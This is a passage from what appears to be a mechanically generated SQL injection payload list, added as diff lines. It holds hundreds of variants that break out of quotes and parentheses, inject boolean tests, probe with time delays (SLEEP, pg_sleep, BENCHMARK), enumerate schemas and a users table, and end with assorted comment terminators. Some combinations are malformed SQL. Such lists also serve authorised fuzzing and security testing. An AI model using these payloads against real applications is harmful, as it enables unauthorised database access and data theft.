+' OR (' OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+' OR (' OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+' OR (' OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+' OR (' OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+' OR (' OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+' OR (' OR NOT SLEEP(2)--
+' OR (' OR NOT SLEEP(2)-- -
+' OR (' OR NOT SLEEP(2)#
+' OR (' OR NOT SLEEP(2);%00
+' OR (' OR NOT SLEEP(2)/*
+' OR (' OR NOT SLEEP(2)/**/
+' OR (' OR NOT SLEEP(2)
+' OR (' OR NOT SLEEP(5)--
+' OR (' OR NOT SLEEP(5)-- -
+' OR (' OR NOT SLEEP(5)#
+' OR (' OR NOT SLEEP(5);%00
+' OR (' OR NOT SLEEP(5)/*
+' OR (' OR NOT SLEEP(5)/**/
+' OR (' OR NOT SLEEP(5)
+' OR (' OR NOT BENCHMARK(100000,MD5(1))--
+' OR (' OR NOT BENCHMARK(100000,MD5(1))-- -
+' OR (' OR NOT BENCHMARK(100000,MD5(1))#
+' OR (' OR NOT BENCHMARK(100000,MD5(1));%00
+' OR (' OR NOT BENCHMARK(100000,MD5(1))/*
+' OR (' OR NOT BENCHMARK(100000,MD5(1))/**/
+' OR (' OR NOT BENCHMARK(100000,MD5(1))
+' OR (' OR NOT pg_sleep(2)--
+' OR (' OR NOT pg_sleep(2)-- -
+' OR (' OR NOT pg_sleep(2)#
+' OR (' OR NOT pg_sleep(2);%00
+' OR (' OR NOT pg_sleep(2)/*
+' OR (' OR NOT pg_sleep(2)/**/
+' OR (' OR NOT pg_sleep(2)
+' OR (' OR NOT pg_sleep(5)--
+' OR (' OR NOT pg_sleep(5)-- -
+' OR (' OR NOT pg_sleep(5)#
+' OR (' OR NOT pg_sleep(5);%00
+' OR (' OR NOT pg_sleep(5)/*
+' OR (' OR NOT pg_sleep(5)/**/
+' OR (' OR NOT pg_sleep(5)
+' OR (' OR NOT EXISTS(SELECT * FROM information_schema.tables)--
+' OR (' OR NOT EXISTS(SELECT * FROM information_schema.tables)-- -
+' OR (' OR NOT EXISTS(SELECT * FROM information_schema.tables)#
+' OR (' OR NOT EXISTS(SELECT * FROM information_schema.tables);%00
+' OR (' OR NOT EXISTS(SELECT * FROM information_schema.tables)/*
+' OR (' OR NOT EXISTS(SELECT * FROM information_schema.tables)/**/
+' OR (' OR NOT EXISTS(SELECT * FROM information_schema.tables)
+' OR (' AND NOT 1=1--
+' OR (' AND NOT 1=1-- -
+' OR (' AND NOT 1=1#
+' OR (' AND NOT 1=1;%00
+' OR (' AND NOT 1=1/*
+' OR (' AND NOT 1=1/**/
+' OR (' AND NOT 1=1
+' OR (' AND NOT 1=2--
+' OR (' AND NOT 1=2-- -
+' OR (' AND NOT 1=2#
+' OR (' AND NOT 1=2;%00
+' OR (' AND NOT 1=2/*
+' OR (' AND NOT 1=2/**/
+' OR (' AND NOT 1=2
+' OR (' AND NOT 'a'='a'--
+' OR (' AND NOT 'a'='a'-- -
+' OR (' AND NOT 'a'='a'#
+' OR (' AND NOT 'a'='a';%00
+' OR (' AND NOT 'a'='a'/*
+' OR (' AND NOT 'a'='a'/**/
+' OR (' AND NOT 'a'='a'
+' OR (' AND NOT 'x'='y'--
+' OR (' AND NOT 'x'='y'-- -
+' OR (' AND NOT 'x'='y'#
+' OR (' AND NOT 'x'='y';%00
+' OR (' AND NOT 'x'='y'/*
+' OR (' AND NOT 'x'='y'/**/
+' OR (' AND NOT 'x'='y'
+' OR (' AND NOT user()=user()--
+' OR (' AND NOT user()=user()-- -
+' OR (' AND NOT user()=user()#
+' OR (' AND NOT user()=user();%00
+' OR (' AND NOT user()=user()/*
+' OR (' AND NOT user()=user()/**/
+' OR (' AND NOT user()=user()
+' OR (' AND NOT version()=version()--
+' OR (' AND NOT version()=version()-- -
+' OR (' AND NOT version()=version()#
+' OR (' AND NOT version()=version();%00
+' OR (' AND NOT version()=version()/*
+' OR (' AND NOT version()=version()/**/
+' OR (' AND NOT version()=version()
+' OR (' AND NOT DATABASE()=DATABASE()--
+' OR (' AND NOT DATABASE()=DATABASE()-- -
+' OR (' AND NOT DATABASE()=DATABASE()#
+' OR (' AND NOT DATABASE()=DATABASE();%00
+' OR (' AND NOT DATABASE()=DATABASE()/*
+' OR (' AND NOT DATABASE()=DATABASE()/**/
+' OR (' AND NOT DATABASE()=DATABASE()
+' OR (' AND NOT (SELECT COUNT(*) FROM users)>0--
+' OR (' AND NOT (SELECT COUNT(*) FROM users)>0-- -
+' OR (' AND NOT (SELECT COUNT(*) FROM users)>0#
+' OR (' AND NOT (SELECT COUNT(*) FROM users)>0;%00
+' OR (' AND NOT (SELECT COUNT(*) FROM users)>0/*
+' OR (' AND NOT (SELECT COUNT(*) FROM users)>0/**/
+' OR (' AND NOT (SELECT COUNT(*) FROM users)>0
+' OR (' AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+' OR (' AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+' OR (' AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+' OR (' AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+' OR (' AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+' OR (' AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+' OR (' AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+' OR (' AND NOT SLEEP(2)--
+' OR (' AND NOT SLEEP(2)-- -
+' OR (' AND NOT SLEEP(2)#
+' OR (' AND NOT SLEEP(2);%00
+' OR (' AND NOT SLEEP(2)/*
+' OR (' AND NOT SLEEP(2)/**/
+' OR (' AND NOT SLEEP(2)
+' OR (' AND NOT SLEEP(5)--
+' OR (' AND NOT SLEEP(5)-- -
+' OR (' AND NOT SLEEP(5)#
+' OR (' AND NOT SLEEP(5);%00
+' OR (' AND NOT SLEEP(5)/*
+' OR (' AND NOT SLEEP(5)/**/
+' OR (' AND NOT SLEEP(5)
+' OR (' AND NOT BENCHMARK(100000,MD5(1))--
+' OR (' AND NOT BENCHMARK(100000,MD5(1))-- -
+' OR (' AND NOT BENCHMARK(100000,MD5(1))#
+' OR (' AND NOT BENCHMARK(100000,MD5(1));%00
+' OR (' AND NOT BENCHMARK(100000,MD5(1))/*
+' OR (' AND NOT BENCHMARK(100000,MD5(1))/**/
+' OR (' AND NOT BENCHMARK(100000,MD5(1))
+' OR (' AND NOT pg_sleep(2)--
+' OR (' AND NOT pg_sleep(2)-- -
+' OR (' AND NOT pg_sleep(2)#
+' OR (' AND NOT pg_sleep(2);%00
+' OR (' AND NOT pg_sleep(2)/*
+' OR (' AND NOT pg_sleep(2)/**/
+' OR (' AND NOT pg_sleep(2)
+' OR (' AND NOT pg_sleep(5)--
+' OR (' AND NOT pg_sleep(5)-- -
+' OR (' AND NOT pg_sleep(5)#
+' OR (' AND NOT pg_sleep(5);%00
+' OR (' AND NOT pg_sleep(5)/*
+' OR (' AND NOT pg_sleep(5)/**/
+' OR (' AND NOT pg_sleep(5)
+' OR (' AND NOT EXISTS(SELECT * FROM information_schema.tables)--
+' OR (' AND NOT EXISTS(SELECT * FROM information_schema.tables)-- -
+' OR (' AND NOT EXISTS(SELECT * FROM information_schema.tables)#
+' OR (' AND NOT EXISTS(SELECT * FROM information_schema.tables);%00
+' OR (' AND NOT EXISTS(SELECT * FROM information_schema.tables)/*
+' OR (' AND NOT EXISTS(SELECT * FROM information_schema.tables)/**/
+' OR (' AND NOT EXISTS(SELECT * FROM information_schema.tables)
+' OR (' OR EXISTS 1=1--
+' OR (' OR EXISTS 1=1-- -
+' OR (' OR EXISTS 1=1#
+' OR (' OR EXISTS 1=1;%00
+' OR (' OR EXISTS 1=1/*
+' OR (' OR EXISTS 1=1/**/
+' OR (' OR EXISTS 1=1
+' OR (' OR EXISTS 1=2--
+' OR (' OR EXISTS 1=2-- -
+' OR (' OR EXISTS 1=2#
+' OR (' OR EXISTS 1=2;%00
+' OR (' OR EXISTS 1=2/*
+' OR (' OR EXISTS 1=2/**/
+' OR (' OR EXISTS 1=2
+' OR (' OR EXISTS 'a'='a'--
+' OR (' OR EXISTS 'a'='a'-- -
+' OR (' OR EXISTS 'a'='a'#
+' OR (' OR EXISTS 'a'='a';%00
+' OR (' OR EXISTS 'a'='a'/*
+' OR (' OR EXISTS 'a'='a'/**/
+' OR (' OR EXISTS 'a'='a'
+' OR (' OR EXISTS 'x'='y'--
+' OR (' OR EXISTS 'x'='y'-- -
+' OR (' OR EXISTS 'x'='y'#
+' OR (' OR EXISTS 'x'='y';%00
+' OR (' OR EXISTS 'x'='y'/*
+' OR (' OR EXISTS 'x'='y'/**/
+' OR (' OR EXISTS 'x'='y'
+' OR (' OR EXISTS user()=user()--
+' OR (' OR EXISTS user()=user()-- -
+' OR (' OR EXISTS user()=user()#
+' OR (' OR EXISTS user()=user();%00
+' OR (' OR EXISTS user()=user()/*
+' OR (' OR EXISTS user()=user()/**/
+' OR (' OR EXISTS user()=user()
+' OR (' OR EXISTS version()=version()--
+' OR (' OR EXISTS version()=version()-- -
+' OR (' OR EXISTS version()=version()#
+' OR (' OR EXISTS version()=version();%00
+' OR (' OR EXISTS version()=version()/*
+' OR (' OR EXISTS version()=version()/**/
+' OR (' OR EXISTS version()=version()
+' OR (' OR EXISTS DATABASE()=DATABASE()--
+' OR (' OR EXISTS DATABASE()=DATABASE()-- -
+' OR (' OR EXISTS DATABASE()=DATABASE()#
+' OR (' OR EXISTS DATABASE()=DATABASE();%00
+' OR (' OR EXISTS DATABASE()=DATABASE()/*
+' OR (' OR EXISTS DATABASE()=DATABASE()/**/
+' OR (' OR EXISTS DATABASE()=DATABASE()
+' OR (' OR EXISTS (SELECT COUNT(*) FROM users)>0--
+' OR (' OR EXISTS (SELECT COUNT(*) FROM users)>0-- -
+' OR (' OR EXISTS (SELECT COUNT(*) FROM users)>0#
+' OR (' OR EXISTS (SELECT COUNT(*) FROM users)>0;%00
+' OR (' OR EXISTS (SELECT COUNT(*) FROM users)>0/*
+' OR (' OR EXISTS (SELECT COUNT(*) FROM users)>0/**/
+' OR (' OR EXISTS (SELECT COUNT(*) FROM users)>0
+' OR (' OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+' OR (' OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+' OR (' OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+' OR (' OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+' OR (' OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+' OR (' OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+' OR (' OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+' OR (' OR EXISTS SLEEP(2)--
+' OR (' OR EXISTS SLEEP(2)-- -
+' OR (' OR EXISTS SLEEP(2)#
+' OR (' OR EXISTS SLEEP(2);%00
+' OR (' OR EXISTS SLEEP(2)/*
+' OR (' OR EXISTS SLEEP(2)/**/
+' OR (' OR EXISTS SLEEP(2)
+' OR (' OR EXISTS SLEEP(5)--
+' OR (' OR EXISTS SLEEP(5)-- -
+' OR (' OR EXISTS SLEEP(5)#
+' OR (' OR EXISTS SLEEP(5);%00
+' OR (' OR EXISTS SLEEP(5)/*
+' OR (' OR EXISTS SLEEP(5)/**/
+' OR (' OR EXISTS SLEEP(5)
+' OR (' OR EXISTS BENCHMARK(100000,MD5(1))--
+' OR (' OR EXISTS BENCHMARK(100000,MD5(1))-- -
+' OR (' OR EXISTS BENCHMARK(100000,MD5(1))#
+' OR (' OR EXISTS BENCHMARK(100000,MD5(1));%00
+' OR (' OR EXISTS BENCHMARK(100000,MD5(1))/*
+' OR (' OR EXISTS BENCHMARK(100000,MD5(1))/**/
+' OR (' OR EXISTS BENCHMARK(100000,MD5(1))
+' OR (' OR EXISTS pg_sleep(2)--
+' OR (' OR EXISTS pg_sleep(2)-- -
+' OR (' OR EXISTS pg_sleep(2)#
+' OR (' OR EXISTS pg_sleep(2);%00
+' OR (' OR EXISTS pg_sleep(2)/*
+' OR (' OR EXISTS pg_sleep(2)/**/
+' OR (' OR EXISTS pg_sleep(2)
+' OR (' OR EXISTS pg_sleep(5)--
+' OR (' OR EXISTS pg_sleep(5)-- -
+' OR (' OR EXISTS pg_sleep(5)#
+' OR (' OR EXISTS pg_sleep(5);%00
+' OR (' OR EXISTS pg_sleep(5)/*
+' OR (' OR EXISTS pg_sleep(5)/**/
+' OR (' OR EXISTS pg_sleep(5)
+' OR (' OR EXISTS EXISTS(SELECT * FROM information_schema.tables)--
+' OR (' OR EXISTS EXISTS(SELECT * FROM information_schema.tables)-- -
+' OR (' OR EXISTS EXISTS(SELECT * FROM information_schema.tables)#
+' OR (' OR EXISTS EXISTS(SELECT * FROM information_schema.tables);%00
+' OR (' OR EXISTS EXISTS(SELECT * FROM information_schema.tables)/*
+' OR (' OR EXISTS EXISTS(SELECT * FROM information_schema.tables)/**/
+' OR (' OR EXISTS EXISTS(SELECT * FROM information_schema.tables)
+' OR (' AND EXISTS 1=1--
+' OR (' AND EXISTS 1=1-- -
+' OR (' AND EXISTS 1=1#
+' OR (' AND EXISTS 1=1;%00
+' OR (' AND EXISTS 1=1/*
+' OR (' AND EXISTS 1=1/**/
+' OR (' AND EXISTS 1=1
+' OR (' AND EXISTS 1=2--
+' OR (' AND EXISTS 1=2-- -
+' OR (' AND EXISTS 1=2#
+' OR (' AND EXISTS 1=2;%00
+' OR (' AND EXISTS 1=2/*
+' OR (' AND EXISTS 1=2/**/
+' OR (' AND EXISTS 1=2
+' OR (' AND EXISTS 'a'='a'--
+' OR (' AND EXISTS 'a'='a'-- -
+' OR (' AND EXISTS 'a'='a'#
+' OR (' AND EXISTS 'a'='a';%00
+' OR (' AND EXISTS 'a'='a'/*
+' OR (' AND EXISTS 'a'='a'/**/
+' OR (' AND EXISTS 'a'='a'
+' OR (' AND EXISTS 'x'='y'--
+' OR (' AND EXISTS 'x'='y'-- -
+' OR (' AND EXISTS 'x'='y'#
+' OR (' AND EXISTS 'x'='y';%00
+' OR (' AND EXISTS 'x'='y'/*
+' OR (' AND EXISTS 'x'='y'/**/
+' OR (' AND EXISTS 'x'='y'
+' OR (' AND EXISTS user()=user()--
+' OR (' AND EXISTS user()=user()-- -
+' OR (' AND EXISTS user()=user()#
+' OR (' AND EXISTS user()=user();%00
+' OR (' AND EXISTS user()=user()/*
+' OR (' AND EXISTS user()=user()/**/
+' OR (' AND EXISTS user()=user()
+' OR (' AND EXISTS version()=version()--
+' OR (' AND EXISTS version()=version()-- -
+' OR (' AND EXISTS version()=version()#
+' OR (' AND EXISTS version()=version();%00
+' OR (' AND EXISTS version()=version()/*
+' OR (' AND EXISTS version()=version()/**/
+' OR (' AND EXISTS version()=version()
+' OR (' AND EXISTS DATABASE()=DATABASE()--
+' OR (' AND EXISTS DATABASE()=DATABASE()-- -
+' OR (' AND EXISTS DATABASE()=DATABASE()#
+' OR (' AND EXISTS DATABASE()=DATABASE();%00
+' OR (' AND EXISTS DATABASE()=DATABASE()/*
+' OR (' AND EXISTS DATABASE()=DATABASE()/**/
+' OR (' AND EXISTS DATABASE()=DATABASE()
+' OR (' AND EXISTS (SELECT COUNT(*) FROM users)>0--
+' OR (' AND EXISTS (SELECT COUNT(*) FROM users)>0-- -
+' OR (' AND EXISTS (SELECT COUNT(*) FROM users)>0#
+' OR (' AND EXISTS (SELECT COUNT(*) FROM users)>0;%00
+' OR (' AND EXISTS (SELECT COUNT(*) FROM users)>0/*
+' OR (' AND EXISTS (SELECT COUNT(*) FROM users)>0/**/
+' OR (' AND EXISTS (SELECT COUNT(*) FROM users)>0
+' OR (' AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+' OR (' AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+' OR (' AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+' OR (' AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+' OR (' AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+' OR (' AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+' OR (' AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+' OR (' AND EXISTS SLEEP(2)--
+' OR (' AND EXISTS SLEEP(2)-- -
+' OR (' AND EXISTS SLEEP(2)#
+' OR (' AND EXISTS SLEEP(2);%00
+' OR (' AND EXISTS SLEEP(2)/*
+' OR (' AND EXISTS SLEEP(2)/**/
+' OR (' AND EXISTS SLEEP(2)
+' OR (' AND EXISTS SLEEP(5)--
+' OR (' AND EXISTS SLEEP(5)-- -
+' OR (' AND EXISTS SLEEP(5)#
+' OR (' AND EXISTS SLEEP(5);%00
+' OR (' AND EXISTS SLEEP(5)/*
+' OR (' AND EXISTS SLEEP(5)/**/
+' OR (' AND EXISTS SLEEP(5)
+' OR (' AND EXISTS BENCHMARK(100000,MD5(1))--
+' OR (' AND EXISTS BENCHMARK(100000,MD5(1))-- -
+' OR (' AND EXISTS BENCHMARK(100000,MD5(1))#
+' OR (' AND EXISTS BENCHMARK(100000,MD5(1));%00
+' OR (' AND EXISTS BENCHMARK(100000,MD5(1))/*
+' OR (' AND EXISTS BENCHMARK(100000,MD5(1))/**/
+' OR (' AND EXISTS BENCHMARK(100000,MD5(1))
+' OR (' AND EXISTS pg_sleep(2)--
+' OR (' AND EXISTS pg_sleep(2)-- -
+' OR (' AND EXISTS pg_sleep(2)#
+' OR (' AND EXISTS pg_sleep(2);%00
+' OR (' AND EXISTS pg_sleep(2)/*
+' OR (' AND EXISTS pg_sleep(2)/**/
+' OR (' AND EXISTS pg_sleep(2)
+' OR (' AND EXISTS pg_sleep(5)--
+' OR (' AND EXISTS pg_sleep(5)-- -
+' OR (' AND EXISTS pg_sleep(5)#
+' OR (' AND EXISTS pg_sleep(5);%00
+' OR (' AND EXISTS pg_sleep(5)/*
+' OR (' AND EXISTS pg_sleep(5)/**/
+' OR (' AND EXISTS pg_sleep(5)
+' OR (' AND EXISTS EXISTS(SELECT * FROM information_schema.tables)--
+' OR (' AND EXISTS EXISTS(SELECT * FROM information_schema.tables)-- -
+' OR (' AND EXISTS EXISTS(SELECT * FROM information_schema.tables)#
+' OR (' AND EXISTS EXISTS(SELECT * FROM information_schema.tables);%00
+' OR (' AND EXISTS EXISTS(SELECT * FROM information_schema.tables)/*
+' OR (' AND EXISTS EXISTS(SELECT * FROM information_schema.tables)/**/
+' OR (' AND EXISTS EXISTS(SELECT * FROM information_schema.tables)
+") OR (" OR 1=1--
+") OR (" OR 1=1-- -
+") OR (" OR 1=1#
+") OR (" OR 1=1;%00
+") OR (" OR 1=1/*
+") OR (" OR 1=1/**/
+") OR (" OR 1=1
+") OR (" OR 1=2--
+") OR (" OR 1=2-- -
+") OR (" OR 1=2#
+") OR (" OR 1=2;%00
+") OR (" OR 1=2/*
+") OR (" OR 1=2/**/
+") OR (" OR 1=2
+") OR (" OR 'a'='a'--
+") OR (" OR 'a'='a'-- -
+") OR (" OR 'a'='a'#
+") OR (" OR 'a'='a';%00
+") OR (" OR 'a'='a'/*
+") OR (" OR 'a'='a'/**/
+") OR (" OR 'a'='a'
+") OR (" OR 'x'='y'--
+") OR (" OR 'x'='y'-- -
+") OR (" OR 'x'='y'#
+") OR (" OR 'x'='y';%00
+") OR (" OR 'x'='y'/*
+") OR (" OR 'x'='y'/**/
+") OR (" OR 'x'='y'
+") OR (" OR user()=user()--
+") OR (" OR user()=user()-- -
+") OR (" OR user()=user()#
+") OR (" OR user()=user();%00
+") OR (" OR user()=user()/*
+") OR (" OR user()=user()/**/
+") OR (" OR user()=user()
+") OR (" OR version()=version()--
+") OR (" OR version()=version()-- -
+") OR (" OR version()=version()#
+") OR (" OR version()=version();%00
+") OR (" OR version()=version()/*
+") OR (" OR version()=version()/**/
+") OR (" OR version()=version()
+") OR (" OR DATABASE()=DATABASE()--
+") OR (" OR DATABASE()=DATABASE()-- -
+") OR (" OR DATABASE()=DATABASE()#
+") OR (" OR DATABASE()=DATABASE();%00
+") OR (" OR DATABASE()=DATABASE()/*
+") OR (" OR DATABASE()=DATABASE()/**/
+") OR (" OR DATABASE()=DATABASE()
+") OR (" OR (SELECT COUNT(*) FROM users)>0--
+") OR (" OR (SELECT COUNT(*) FROM users)>0-- -
+") OR (" OR (SELECT COUNT(*) FROM users)>0#
+") OR (" OR (SELECT COUNT(*) FROM users)>0;%00
+") OR (" OR (SELECT COUNT(*) FROM users)>0/*
+") OR (" OR (SELECT COUNT(*) FROM users)>0/**/
+") OR (" OR (SELECT COUNT(*) FROM users)>0
+") OR (" OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+") OR (" OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+") OR (" OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+") OR (" OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+") OR (" OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+") OR (" OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+") OR (" OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+") OR (" OR SLEEP(2)--
+") OR (" OR SLEEP(2)-- -
+") OR (" OR SLEEP(2)#
+") OR (" OR SLEEP(2);%00
+") OR (" OR SLEEP(2)/*
+") OR (" OR SLEEP(2)/**/
+") OR (" OR SLEEP(2)
+") OR (" OR SLEEP(5)--
+") OR (" OR SLEEP(5)-- -
+") OR (" OR SLEEP(5)#
+") OR (" OR SLEEP(5);%00
+") OR (" OR SLEEP(5)/*
+") OR (" OR SLEEP(5)/**/
+") OR (" OR SLEEP(5)
+") OR (" OR BENCHMARK(100000,MD5(1))--
+") OR (" OR BENCHMARK(100000,MD5(1))-- -
+") OR (" OR BENCHMARK(100000,MD5(1))#
+") OR (" OR BENCHMARK(100000,MD5(1));%00
+") OR (" OR BENCHMARK(100000,MD5(1))/*
+") OR (" OR BENCHMARK(100000,MD5(1))/**/
+") OR (" OR BENCHMARK(100000,MD5(1))
+") OR (" OR pg_sleep(2)--
+") OR (" OR pg_sleep(2)-- -
+") OR (" OR pg_sleep(2)#
+") OR (" OR pg_sleep(2);%00
+") OR (" OR pg_sleep(2)/*
+") OR (" OR pg_sleep(2)/**/
+") OR (" OR pg_sleep(2)
+") OR (" OR pg_sleep(5)--
+") OR (" OR pg_sleep(5)-- -
+") OR (" OR pg_sleep(5)#
+") OR (" OR pg_sleep(5);%00
+") OR (" OR pg_sleep(5)/*
+") OR (" OR pg_sleep(5)/**/
+") OR (" OR pg_sleep(5)
+") OR (" OR EXISTS(SELECT * FROM information_schema.tables)--
+") OR (" OR EXISTS(SELECT * FROM information_schema.tables)-- -
+") OR (" OR EXISTS(SELECT * FROM information_schema.tables)#
+") OR (" OR EXISTS(SELECT * FROM information_schema.tables);%00
+") OR (" OR EXISTS(SELECT * FROM information_schema.tables)/*
+") OR (" OR EXISTS(SELECT * FROM information_schema.tables)/**/
+") OR (" OR EXISTS(SELECT * FROM information_schema.tables)
+") OR (" AND 1=1--
+") OR (" AND 1=1-- -
+") OR (" AND 1=1#
+") OR (" AND 1=1;%00
+") OR (" AND 1=1/*
+") OR (" AND 1=1/**/
+") OR (" AND 1=1
+") OR (" AND 1=2--
+") OR (" AND 1=2-- -
+") OR (" AND 1=2#
+") OR (" AND 1=2;%00
+") OR (" AND 1=2/*
+") OR (" AND 1=2/**/
+") OR (" AND 1=2
+") OR (" AND 'a'='a'--
+") OR (" AND 'a'='a'-- -
+") OR (" AND 'a'='a'#
+") OR (" AND 'a'='a';%00
+") OR (" AND 'a'='a'/*
+") OR (" AND 'a'='a'/**/
+") OR (" AND 'a'='a'
+") OR (" AND 'x'='y'--
+") OR (" AND 'x'='y'-- -
+") OR (" AND 'x'='y'#
+") OR (" AND 'x'='y';%00
+") OR (" AND 'x'='y'/*
+") OR (" AND 'x'='y'/**/
+") OR (" AND 'x'='y'
+") OR (" AND user()=user()--
+") OR (" AND user()=user()-- -
+") OR (" AND user()=user()#
+") OR (" AND user()=user();%00
+") OR (" AND user()=user()/*
+") OR (" AND user()=user()/**/
+") OR (" AND user()=user()
+") OR (" AND version()=version()--
+") OR (" AND version()=version()-- -
+") OR (" AND version()=version()#
+") OR (" AND version()=version();%00
+") OR (" AND version()=version()/*
+") OR (" AND version()=version()/**/
+") OR (" AND version()=version()
+") OR (" AND DATABASE()=DATABASE()--
+") OR (" AND DATABASE()=DATABASE()-- -
+") OR (" AND DATABASE()=DATABASE()#
+") OR (" AND DATABASE()=DATABASE();%00
+") OR (" AND DATABASE()=DATABASE()/*
+") OR (" AND DATABASE()=DATABASE()/**/
+") OR (" AND DATABASE()=DATABASE()
+") OR (" AND (SELECT COUNT(*) FROM users)>0--
+") OR (" AND (SELECT COUNT(*) FROM users)>0-- -
+") OR (" AND (SELECT COUNT(*) FROM users)>0#
+") OR (" AND (SELECT COUNT(*) FROM users)>0;%00
+") OR (" AND (SELECT COUNT(*) FROM users)>0/*
+") OR (" AND (SELECT COUNT(*) FROM users)>0/**/
+") OR (" AND (SELECT COUNT(*) FROM users)>0
+") OR (" AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+") OR (" AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+") OR (" AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+") OR (" AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+") OR (" AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+") OR (" AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+") OR (" AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+") OR (" AND SLEEP(2)--
+") OR (" AND SLEEP(2)-- -
+") OR (" AND SLEEP(2)#
+") OR (" AND SLEEP(2);%00
+") OR (" AND SLEEP(2)/*
+") OR (" AND SLEEP(2)/**/
+") OR (" AND SLEEP(2)
+") OR (" AND SLEEP(5)--
+") OR (" AND SLEEP(5)-- -
+") OR (" AND SLEEP(5)#
+") OR (" AND SLEEP(5);%00
+") OR (" AND SLEEP(5)/*
+") OR (" AND SLEEP(5)/**/
+") OR (" AND SLEEP(5)
+") OR (" AND BENCHMARK(100000,MD5(1))--
+") OR (" AND BENCHMARK(100000,MD5(1))-- -
+") OR (" AND BENCHMARK(100000,MD5(1))#
+") OR (" AND BENCHMARK(100000,MD5(1));%00
+") OR (" AND BENCHMARK(100000,MD5(1))/*
+") OR (" AND BENCHMARK(100000,MD5(1))/**/
+") OR (" AND BENCHMARK(100000,MD5(1))
+") OR (" AND pg_sleep(2)--
+") OR (" AND pg_sleep(2)-- -
+") OR (" AND pg_sleep(2)#
+") OR (" AND pg_sleep(2);%00
+") OR (" AND pg_sleep(2)/*
+") OR (" AND pg_sleep(2)/**/
+") OR (" AND pg_sleep(2)
+") OR (" AND pg_sleep(5)--
+") OR (" AND pg_sleep(5)-- -
+") OR (" AND pg_sleep(5)#
+") OR (" AND pg_sleep(5);%00
+") OR (" AND pg_sleep(5)/*
+") OR (" AND pg_sleep(5)/**/
+") OR (" AND pg_sleep(5)
+") OR (" AND EXISTS(SELECT * FROM information_schema.tables)--
+") OR (" AND EXISTS(SELECT * FROM information_schema.tables)-- -
+") OR (" AND EXISTS(SELECT * FROM information_schema.tables)#
+") OR (" AND EXISTS(SELECT * FROM information_schema.tables);%00
+") OR (" AND EXISTS(SELECT * FROM information_schema.tables)/*
+") OR (" AND EXISTS(SELECT * FROM information_schema.tables)/**/
+") OR (" AND EXISTS(SELECT * FROM information_schema.tables)
+") OR (" OR NOT 1=1--
+") OR (" OR NOT 1=1-- -
+") OR (" OR NOT 1=1#
+") OR (" OR NOT 1=1;%00
+") OR (" OR NOT 1=1/*
+") OR (" OR NOT 1=1/**/
+") OR (" OR NOT 1=1
+") OR (" OR NOT 1=2--
+") OR (" OR NOT 1=2-- -
+") OR (" OR NOT 1=2#
+") OR (" OR NOT 1=2;%00
+") OR (" OR NOT 1=2/*
+") OR (" OR NOT 1=2/**/
+") OR (" OR NOT 1=2
+") OR (" OR NOT 'a'='a'--
+") OR (" OR NOT 'a'='a'-- -
+") OR (" OR NOT 'a'='a'#
+") OR (" OR NOT 'a'='a';%00
+") OR (" OR NOT 'a'='a'/*
+") OR (" OR NOT 'a'='a'/**/
+") OR (" OR NOT 'a'='a'
+") OR (" OR NOT 'x'='y'--
+") OR (" OR NOT 'x'='y'-- -
+") OR (" OR NOT 'x'='y'#
+") OR (" OR NOT 'x'='y';%00
+") OR (" OR NOT 'x'='y'/*
+") OR (" OR NOT 'x'='y'/**/
+") OR (" OR NOT 'x'='y'
+") OR (" OR NOT user()=user()--
+") OR (" OR NOT user()=user()-- -
+") OR (" OR NOT user()=user()#
+") OR (" OR NOT user()=user();%00
+") OR (" OR NOT user()=user()/*
+") OR (" OR NOT user()=user()/**/
+") OR (" OR NOT user()=user()
+") OR (" OR NOT version()=version()--
+") OR (" OR NOT version()=version()-- -
+") OR (" OR NOT version()=version()#
+") OR (" OR NOT version()=version();%00
+") OR (" OR NOT version()=version()/*
+") OR (" OR NOT version()=version()/**/
+") OR (" OR NOT version()=version()
+") OR (" OR NOT DATABASE()=DATABASE()--
+") OR (" OR NOT DATABASE()=DATABASE()-- -
